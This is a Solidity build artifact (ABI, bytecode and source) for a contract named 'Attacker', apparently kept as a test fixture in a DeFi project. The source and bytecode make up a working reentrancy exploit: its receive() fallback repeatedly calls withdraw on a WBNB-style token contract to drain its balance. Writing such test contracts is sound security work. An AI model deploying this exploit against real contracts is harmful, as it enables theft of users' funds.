{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_weth",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161025638038061025683398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6101c3806100936000396000f3fe6080604052600436106100225760003560e01c80639e5faafc146100a657600080fd5b366100a1576000546001600160a01b0316311561009f57600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b0390911690632e1a7d4d90602401600060405180830381600087803b15801561008657600080fd5b505af115801561009a573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100b257600080fd5b5061009f60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561010c57600080fd5b505af1158015610120573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b039091169350632e1a7d4d92506024019050600060405180830381600087803b15801561017357600080fd5b505af1158015610187573d6000803e3d6000fd5b5050505056fea2646970667358221220388619369dc2d5cd79123f6539b778222e8bb51179e9b15a9c3b0ea1fc693d2464736f6c634300080c0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.9;\r\n\r\nimport \"../WBNB.sol\";\r\n\r\ncontract Attacker {\r\n\r\n  WBNB weth;\r\n\r\n  constructor(address _weth) {\r\n    weth = WBNB(_weth);\r\n  }\r\n\r\n  function attack() external {\r\n    weth.deposit{value: 1 ether}();\r\n    weth.withdraw(1 ether);\r\n  }\r\n\r\n  receive() external payable {\r\n    if(address(weth).balance > 0){\r\n      weth.withdraw(1 ether);\r\n    }\r\n  }\r\n\r\n}",
  "sourcePath": "C:\\Users\\surge\\Desktop\\dapp-projects\\liquidip\\contracts\\test\\Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.12+commit.f00d7308.Emscripten.clang"
  },
  "schemaVersion": "3.4.15",
  "updatedAt": "2023-08-15T05:05:28.281Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}